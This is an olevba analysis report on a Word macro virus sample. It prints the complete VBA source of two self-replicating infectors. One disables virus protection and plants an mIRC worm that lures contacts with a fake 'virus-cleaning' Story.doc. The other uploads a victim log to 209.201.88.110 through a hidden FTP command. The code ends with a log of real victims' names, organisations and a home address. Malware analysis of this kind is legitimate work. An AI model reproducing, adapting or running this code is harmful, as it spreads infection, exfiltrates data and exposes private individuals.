olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-79b1ea94230ea3e8444f6d7644afa146fcb9895d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-79b1ea94230ea3e8444f6d7644afa146fcb9895d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'Jack-In-The-Box
Set Something = Options
Something.VirusProtection = 0
Something.ConfirmConversions = 0
Something.SaveNormalPrompt = 0
Application.EnableCancelKey = 0
Application.StatusBar = 0
Application.ScreenUpdating = 0
Set AnI = ActiveDocument.VBProject.VBComponents(1)
Set BnI = NormalTemplate.VBProject.VBComponents(1)
If UCase(AnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InA = 1
If UCase(BnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InB = 1
If InA = 1 And InB = 1 Then Exit Sub
Set CnI = MacroContainer.VBProject.VBComponents.Item(1)
VCode = CnI.CodeModule.Lines(2, CnI.CodeModule.CountOfLines)
If InA = 1 Then BnI.CodeModule.AddFromString ("Private Sub Document_Close" & Chr(13) & VCode)
If InB = 1 Then AnI.CodeModule.AddFromString ("Private Sub Document_Open" & Chr(13) & VCode)
NormalTemplate.Save
somename = ActiveDocument.Name
DoEvents
If InB = 1 Then
If Dir("C:\mirc\mirc32.exe") <> "" Then
var3 = "C:\mirc\script.ini"
If System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") = "off"
If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
If Dir(var3) <> "" Then Kill var3
Open "C:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
Print #1, "n1=On 1:Input:*:{ Set %var1 $1- | If ( $upper(%var1) = /BY ) { .echo 1Mirc Worm 4Jack-In-The-Box | .echo 12<9<12<9By SimpleSimon12>9>12> | halt } }"
Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
Print #1, "n3=On 1:Unotify: .clear -s"
Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
Print #1, "n5=On 1:Filercvd:*.*: If ( $me != $nick ) { .dcc send $nick C:\Windows\Story.doc }"
Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
DoEvents
Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
Print #1, "n8=On 1:Text:*script*:*: .ignore $nick"
Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
Print #1, "n10=On 1:Text:*virus*:*: .ignore $nick"
Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
Print #1, "n12=On 1:Text:*Jack*Box*:*: .ignore $nick"
Print #1, "n13=On 1:Text:*macro*:*: .ignore $nick"
Print #1, "n14=On 1:Text:*Story.doc*: .ignore $nick"
Print #1, "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
DoEvents
Print #1, "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
Print #1, "n17=On 1:Text:*Hey*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
Print #1, "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
Print #1, "n19=On 1:Sockopen:virc:{ Unset %var2 | Unset %var4 | Unset %var6 | Set %var1 $rand(3, 8) + 1 | Set %loop 1 | Set %var3 0 | :check1 | If ( %loop = %var1 ) { goto out } | If ( %var3 = 0 ) { Set %var2 %var2 $rand(A, Z) } | If ( %var3 = 1 ) { Set %var4 %var4 $rand(A, Z) } | If ( %var3 = 2 ) { Set %var6 %var6 $rand(A, Z) } | If ( %var3 = 2 ) && ( $rand(1, 3) = 2 ) { Set %var6 %var6 $chr(225) } | inc %loop | goto check1 | :out | If ( %var3 = 0 ) { Set %var3 1 | Set %var1 $rand(3, 8) | Set %loop 1 | goto check1 } | If ( %var3 = 1 ) { Set %var3 2 | Set %var1 $rand(5, 50) | Set %loop 1 | goto check1 } | Set %var2 $remove(%var2, $chr(32) ) | Set %var4 $remove(%var4, $chr(32) ) | Set %var5 %var2 @ %var4 .com | Set %var5 $remove(%var5, $chr(32) ) | Set %var6 $remove(%var6, $chr(32) ) | Set %var6 $replace(%var6, $chr(225), $chr(32) ) | If ( %var7 = 6 ) { .sockwrite -n virc Helo %var2 } | .sockwrite -n virc mail from: %var5"
Print #1, "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
Print #1, "n21=On 1:Disconnect:{ If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini } | If ( $exists(C:\Windows\script1.ini) = $true ) { .copy C:\Windows\script1.ini C:\mirc\script.ini | .remove C:\Windows\script1.ini } }"
Close #1
If Dir("C:\windows\Story.doc") = "" Then
ActiveDocument.SaveAs FileName:="C:\Windows\Story.doc", AddToRecentFiles:=False
End If
End If
If Left(somename, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
CommandBars("Tools").Controls("Macro").Enabled = 0
CommandBars("Tools").Controls("Customize...").Enabled = 0
CommandBars("View").Controls("Toolbars").Enabled = 0
CommandBars("View").Controls("Status Bar").Enabled = 0
End Sub
















































Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 12:04:46 PM - Wednesday, 23 Dec 1998
' BCBSA
'



' 11:32:13 AM - Thursday, 24 Dec 1998
' BCBSA
'



' 11:43:52 AM - Monday, 28 Dec 1998
' BCBSA
'



' 12:03:48 PM - Wednesday, 6 Jan 1999
' Tricia
'



' 11:45:55 AM - Thursday, 14 Jan 1999
' Debra C. Hopkinson
'



' 04:41:56 PM - Monday, 18 Jan 1999
' Jim Klein
'



' 02:34:27 PM - Saturday, 23 Jan 1999
' Lee Setkowsky
'



' 03:19:32 PM - Wednesday, 3 Feb 1999
' Sharon Green
'



' 10:12:40 AM - Thursday, 11 Feb 1999
' Bruce MacLaughlin
'



' 11:10:18 AM - Thursday, 4 Mar 1999
' James Lynch
'



' 05:01:46 PM - Tuesday, 9 Mar 1999
' Erin Hinman
'



' 05:46:35 AM - Friday, 12 Mar 1999
' EDS
'



' 09:54:50 AM - Tuesday, 16 Mar 1999
' EDS
'



' 04:22:15 PM - Friday, 19 Mar 1999
' Preferred Customer
'



' 08:42:27 PM - Thursday, 25 Mar 1999
' controlrm
'



' 07:29:25 AM - Thursday, 1 Jul 1999
' Gateway Valued Customer
' MATTHEW  SIMPSON
' 11941 JUNIPER WAY #1043
' GRAND BLANC MI
' 48439-2139



' 02:31:40 PM - Wednesday, 13 Oct 1999
' Police Department
'



' 03:58:29 PM - Tuesday, 2 Nov 1999
' Jeff Wilson
'



' 07:07:59 AM - Tuesday, 9 Nov 1999
' Jeffrey Scott wilson
'



' 08:07:24 AM - Monday, 6 Dec 1999
' opf  mko mkop
'



' 12:43:10 PM - Monday, 6 Dec 1999
' GBHS Bit LAb
'



' 12:12:42 PM - Tuesday, 7 Dec 1999
' Bit Labs
'




' 09:14:49 AM - Wednesday, 8 Dec 1999
' GBHS Bit LAb
'



' 10:06:30 AM - Friday, 17 Dec 1999
' Grand Blanc Community Schools
'



' 10:49:29 AM - Monday, 3 Jan 2000
' Grand Blanc Community Schools
'



' 09:13:29 AM - Friday, 7 Jan 2000
' Grand Blanc Community Schools
'



' 12:53:40 PM - Tuesday, 7 Mar 2000
' opf  mko mkop
'




' 03:00:53 PM - Wednesday, 1 Nov 2000
' GBHS Bit LAb
'




' 10:49:34 AM - Friday, 3 Nov 2000
' GBHS Bit LAb
'




' 03:59:37 PM - Monday, 6 Nov 2000
' Nasir Malik
'



' 09:10:41 PM - Tuesday, 23 Jan 2001
' Nasir Malik
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

